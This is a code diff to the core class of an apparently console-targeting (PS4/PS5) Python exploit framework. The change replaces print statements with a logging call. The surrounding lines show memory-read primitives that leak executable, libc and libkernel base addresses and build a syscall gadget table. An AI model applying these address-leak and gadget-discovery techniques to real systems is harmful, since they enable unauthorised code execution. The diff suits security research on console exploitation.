@@ -3,9 +3,14 @@ from types import FunctionType
 from utils.unsafe import getmem, readuint, readbuf
 from utils.etc import addrof, alloc
 from utils.ref import refbytes
+from utils.rp import log
 from utils.conversion import get_cstring
+from constants import (
+    SELECTED_LIBC,
+    SELECTED_EXEC,
+    nogc,
+)
 from structure import Structure
-from constants import SELECTED_LIBC, SELECTED_EXEC, nogc
 from calls import Function, Syscall, FunctionContainer, SyscallContainer
 
 
@@ -16,21 +21,21 @@ class SploitCore(object):
     def __init__(self):
         self.mem = getmem()
 
-        print("[*] Obtained memory object")
+        log("[*] Obtained memory object")
 
         func_type_addr = addrof(FunctionType)
-        print("[*] FunctionType address: 0x%x" % func_type_addr)
+        log("[*] FunctionType address: 0x%x" % func_type_addr)
         func_repr_addr = readuint(func_type_addr + 11 * 8, 8)
-        print("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)
+        log("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)
 
         self.exec_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
-        print("[*] Executable base address: 0x%x" % self.exec_addr)
+        log("[*] Executable base address: 0x%x" % self.exec_addr)
 
         self.libc_addr = (
             readuint(self.exec_addr + SELECTED_EXEC["strcmp"], 8)
             - SELECTED_LIBC["strcmp"]
         )
-        print("[*] libc base address: 0x%x" % self.libc_addr)
+        log("[*] libc base address: 0x%x" % self.libc_addr)
 
         self.functions = FunctionContainer(self)
         self.syscalls = SyscallContainer(self)
@@ -43,7 +48,7 @@ class SploitCore(object):
         gettimeofday_in_libkernel = readuint(
             self.libc_addr + SELECTED_LIBC["gettimeofday"], 8
         )
-        print("[*] gettimeofday address: 0x%x" % gettimeofday_in_libkernel)
+        log("[*] gettimeofday address: 0x%x" % gettimeofday_in_libkernel)
 
         # eh why not
         self.make_function_if_needed("gettimeofday", gettimeofday_in_libkernel)
@@ -73,7 +78,7 @@ class SploitCore(object):
             raise Exception("sceKernelGetModuleInfoFromAddr failed: 0x%x" % ret)
 
         self.libkernel_addr = mod_info.segments
-        print("[*] libkernel base address: 0x%x" % self.libkernel_addr)
+        log("[*] libkernel base address: 0x%x" % self.libkernel_addr)
         init_proc_addr = mod_info.init_proc_addr
         delta = self.libkernel_addr - init_proc_addr
 
@@ -108,13 +113,13 @@ class SploitCore(object):
                     self.syscall_table[syscall_number] = syscall_gadget_addr
             if not self.syscall_table:
                 raise Exception("syscall gadget pattern not found")
-            print("[*] syscall gadget table built")
+            log("[*] syscall gadget table built")
         elif delta == 0x10:
             self.platform = "ps5"
             self.syscall_addr = (
                 gettimeofday_in_libkernel + 0x7
             )  # to skip `mov rax, <num>`
-            print("[*] syscall gadget address: 0x%x" % self.syscall_addr)
+            log("[*] syscall gadget address: 0x%x" % self.syscall_addr)
         else:
             raise Exception("Unknown platform (delta: 0x%x)" % delta)
 
@@ -124,9 +129,9 @@ class SploitCore(object):
         if self.sysctl("kern.sdk_version", buf, size):
             lower, upper = struct.unpack("<BB", buf[2:4])
             self.version = "%x.%02x" % (upper, lower)
-            print("[*] Detected OS version: %s" % self.version)
+            log("[*] Detected OS version: %s" % self.version)
         else:
-            print("[*] Could not detect OS version")
+            log("[*] Could not detect OS version")
 
     def make_function_if_needed(self, name, func_addr):
         if name not in self.functions.functions:
@@ -166,7 +171,7 @@ class SploitCore(object):
             O_WRONLY,
         )
         if fd < 0:
-            print("[-] Failed to open notification device")
+            log("[-] Failed to open notification device")
             return
 
         self.syscalls.write(
@@ -191,7 +196,7 @@ class SploitCore(object):
                     self.syscalls.netgetiflist.get_error_string(),
                 )
             )
-        print("[*] Found %d network interfaces" % count)
+        log("[*] Found %d network interfaces" % count)
 
         buf_size = count * 0x1E0
         ifbuf = b"\0" * buf_size
